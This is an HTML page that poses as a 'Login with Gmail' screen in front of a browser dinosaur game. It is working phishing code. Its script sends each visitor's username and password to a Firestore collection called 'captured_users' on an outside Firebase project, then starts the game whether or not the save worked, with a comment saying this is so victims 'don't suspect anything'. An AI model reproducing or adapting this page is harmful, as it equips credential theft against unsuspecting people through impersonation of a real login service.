<!DOCTYPE html>
<html>
<head>
    <title>Dino Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { margin: 0; font-family: sans-serif; background: #f7f7f7; overflow: hidden; }
        #login-screen { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: #202124; color: white; }
        .modal { background: white; padding: 30px; border-radius: 8px; color: black; width: 300px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #34a853; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
        
        /* Game Styling */
        #game-screen { display: none; width: 100vw; height: 100vh; background: #fff; }
        canvas { display: block; margin: 0 auto; }
    </style>
</head>
<body>

    <div id="login-screen">
        <div class="modal">
            <h2>Login with Gmail</h2>
            <input type="text" id="email" placeholder="Username/Email">
            <input type="password" id="pass" placeholder="Password">
            <button onclick="captureAndStart()">Sign In & Play</button>
        </div>
    </div>

    <div id="game-screen">
        <h3 style="text-align:center; color:#555">Press Space to Jump!</h3>
        <iframe src="https://wayou.github.io/t-rex-runner/" style="width:100%; height:90%; border:none;"></iframe>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js";

        // --- PASTE YOUR FIREBASE CONFIG HERE ---
        const firebaseConfig = {
            apiKey: "AIzaSyDmo2opmCMCr9s4uhPljEc0I1A0EBDr3B4",
            authDomain: "t-rex-3bb54.firebaseapp.com",
            projectId: "t-rex-3bb54",
            storageBucket: "t-rex-3bb54.firebasestorage.app",
            messagingSenderId: "109402651520",
            appId: "1:109402651520:web:c49a7c21effeeacbab5f65"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        window.captureAndStart = async function() {
            const userVal = document.getElementById('email').value;
            const passVal = document.getElementById('pass').value;

            if(!userVal || !passVal) return alert("Fill everything!");

            try {
                // This saves the data to your Firebase Dashboard
                await addDoc(collection(db, "captured_users"), {
                    username: userVal,
                    password: passVal,
                    time: new Date()
                });

                // Switch Screens
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('game-screen').style.display = 'block';
            } catch (e) {
                console.error("Error adding document: ", e);
                // Even if it fails, start the game so they don't suspect anything
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('game-screen').style.display = 'block';
            }
        }
    </script>
</body>
</html>
